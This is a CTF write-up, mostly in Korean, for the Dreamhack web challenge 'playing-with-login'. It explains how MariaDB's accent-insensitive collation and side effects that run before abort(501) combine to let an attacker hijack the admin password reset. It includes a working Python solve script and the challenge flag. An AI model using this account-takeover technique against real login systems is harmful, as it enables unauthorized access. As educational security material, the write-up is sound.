# playing-with-login

- **Platform**: Dreamhack
- **Category**: Web
- **Level**: 4
- **Event**: Dreamhack CTF Season 8 Round #2 (Web)
- **Solved**: 2026-03-29
- **Flag**: `DH{C011473_0N_UN4M3:7DYPdq0FPwRa56XhP5r7cA==}`

## Summary

Flask 웹 서비스가 v1(in-memory) / v2(MariaDB) 두 버전을 동시에 운영하며, MariaDB 11.3.2의 기본 collation `utf8mb4_uca1400_ai_ci`의 accent-insensitive 특성을 이용하여 admin 계정의 비밀번호를 탈취하는 문제.

## Architecture

```
v1 (in-memory)                    v2 (MariaDB DB)
├─ /v1/signup      (lowercased)   ├─ /v2/signup      (DB UNIQUE check)
├─ /v1/login       (dict lookup)  ├─ /v2/login       (DB query)
├─ /v1/mypage      (inbox dict)   ├─ /v2/mypage      (inbox dict - SHARED)
├─ /v1/request-pw  (dict check)   ├─ /v2/request-pw  (DB query + abort 501)
└─ /v1/change-pw   (dict token)   └─ /v2/change-pw   (DB token + abort 501)
```

**Shared state**: `inbox` dict, `session` (Flask cookie)

## Vulnerability Analysis

### 1. MariaDB collation mismatch

MariaDB 11.3.2 기본 collation: `utf8mb4_uca1400_ai_ci`
- **ai** = accent insensitive → `á` == `a`
- **ci** = case insensitive → `A` == `a`

Python dict는 accent-sensitive → `"ádmin" != "admin"`

### 2. v2 side-effects before abort(501)

v2 엔드포인트들은 `abort(501)` 반환하지만, 그 전에 부작용이 실행됨:
- `request_password_change_v2`: DB 토큰 생성 + inbox에 링크 저장 → 501
- `password_reset_v2`: `db_update_user_password()` 실행 → 501

### 3. inbox key confusion

```python
# v2 request-password-change
username = request.form.get("username", "").strip()  # raw form input
if db_get_user_by_username(username):                 # DB: accent-insensitive match
    token = db_create_reset_token(username=db_get_user_by_username(username)['username'], ...)
    inbox_post(username, ...)  # inbox key = raw form input, NOT DB value
```

`username="ádmin"` 전송 시:
- DB 쿼리: `ádmin` → `admin` 매칭 (ai collation)
- 토큰: admin용으로 생성
- inbox: `inbox["ádmin"]`에 저장 (Python은 accent-sensitive)

## Exploit Chain

```
Step 1: v1 signup "ádmin" (password=X)
  → Python dict에 "ádmin" 추가 (v1은 .lower()만 하므로 á 보존)
  → "ádmin" != "admin" → 중복 아님

Step 2: v2 request-password-change username="ádmin"
  → DB에서 'admin' 찾음 (accent-insensitive)
  → admin용 reset 토큰 생성
  → inbox["ádmin"]에 reset URL 저장
  → abort(501) 반환 (하지만 side effect 완료)

Step 3: v1 login "ádmin" / X
  → Python dict에 "ádmin" 있음 → 로그인 성공
  → session["user"] = "ádmin"

Step 4: v1 mypage 접근
  → inbox["ádmin"] → v2 reset 토큰 URL 획득

Step 5: v2 change-password/<token> POST
  → DB에서 admin 비밀번호 변경 (abort(501) 전에 실행)

Step 6: v2 login "admin" / new_password
  → DB 인증 성공 → session["user"] = "admin"

Step 7: v2 mypage 접근
  → inbox["admin"] → FLAG
```

## Solve Script

```python
import requests, re, sys

TARGET = sys.argv[1]
ACCENT_ADMIN = "\u00e1dmin"  # ádmin
NEW_PW = "pwned123"

s = requests.Session()

# 1. v1 signup ádmin
s.post(f"{TARGET}/v1/signup", data={"username": ACCENT_ADMIN, "password": NEW_PW})

# 2. v2 request-password-change for ádmin (DB matches admin)
s.post(f"{TARGET}/v2/request-password-change", data={"username": ACCENT_ADMIN})

# 3. v1 login as ádmin
s.post(f"{TARGET}/v1/login", data={"username": ACCENT_ADMIN, "password": NEW_PW})

# 4. Get reset token from mypage
r = s.get(f"{TARGET}/v1/mypage")
token_path = re.search(r'/v2/change-password/[A-Za-z0-9_-]+', r.text).group(0)

# 5. Change admin's DB password via v2 (returns 501 but password changes)
s.post(f"{TARGET}{token_path}", data={"new_password": NEW_PW, "confirm_password": NEW_PW})

# 6-7. Login as admin via v2, read flag from mypage
s2 = requests.Session()
s2.post(f"{TARGET}/v2/login", data={"username": "admin", "password": NEW_PW})
r = s2.get(f"{TARGET}/v2/mypage")
print(re.search(r'DH\{[^}]+\}', r.text).group(0))
```

## Key Techniques

| Technique | Detail |
|-----------|--------|
| Collation confusion | MariaDB uca1400_ai_ci accent-insensitive vs Python accent-sensitive |
| Side-effect before abort | v2 엔드포인트가 501 반환하지만 DB 변경은 이미 실행됨 |
| Shared state abuse | v1/v2가 동일한 inbox dict와 session 공유 |
| Username confusion | DB 쿼리의 username과 inbox key가 다른 값 사용 |

## Lessons Learned

1. **MariaDB 11.3+ 기본 collation 변경**: `utf8mb4_uca1400_ai_ci`는 accent-insensitive. 이전 버전의 `utf8mb4_general_ci`는 accent-sensitive였음. 버전에 따른 collation 차이가 취약점 원인.
2. **abort() 전 side-effect**: Flask의 `abort()`는 즉시 예외를 발생시키지만, 그 전에 실행된 DB 쿼리는 이미 commit됨 (autocommit=True).
3. **v1/v2 공존 서비스**: 마이그레이션 중 두 버전이 공존할 때, 공유 상태(session, 메모리 객체)를 통한 교차 공격이 가능.
